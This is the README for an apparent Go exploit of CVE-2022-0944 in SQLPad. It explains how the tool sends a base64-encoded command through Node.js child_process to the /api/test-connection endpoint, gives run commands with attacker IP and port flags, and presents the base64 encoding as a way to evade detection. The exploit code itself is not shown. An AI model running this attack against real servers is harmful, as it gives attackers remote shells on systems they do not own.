# CVE-2022-0944 RCE Exploit in Go

This project is a Go implementation of an exploit for CVE-2022-0944. It demonstrates how to leverage a Remote Code Execution (RCE) vulnerability in SQLPad by sending a specially crafted payload to execute arbitrary commands on the server.

## Features
- Base64 encoding of the payload to evade simple detection mechanisms.
- Sending an HTTP POST request to the target URL with the exploit payload.
- Simple and modular code structure for easy customization.

## Prerequisites
- Go 1.16 or later installed on your machine.
- A vulnerable instance of SQLPad to test against.
- An attacker machine with a listener set up to capture the reverse shell.

## Usage

### Compile and Run

1. Clone the repository (if applicable):
   ```bash
   git clone <repository_url>
   cd <repository_folder>
   ```
2. Run the script directly using go run:
    ```bash
    go run exploit.go -u <root_url> -i <attacker_ip> -p <attacker_port>
    ```
    Replace <root_url>, <attacker_ip>, and <attacker_port> with the appropriate values:

    - -u: The root URL of the SQLPad application (e.g., http://example.com).
    - -i: The IP address of the attacker's machine.
    - -p: The port on the attacker's machine to listen for the reverse shell.

## Explanation
- Base64 Encoding: The payload is encoded using Base64 to bypass basic input filtering mechanisms.
- Payload Construction: The child_process module in Node.js is used to execute a bash command that decodes the Base64 payload and then runs it.
- HTTP POST Request: The exploit payload is sent via an HTTP POST request to the /api/test-connection endpoint of the SQLPad application.
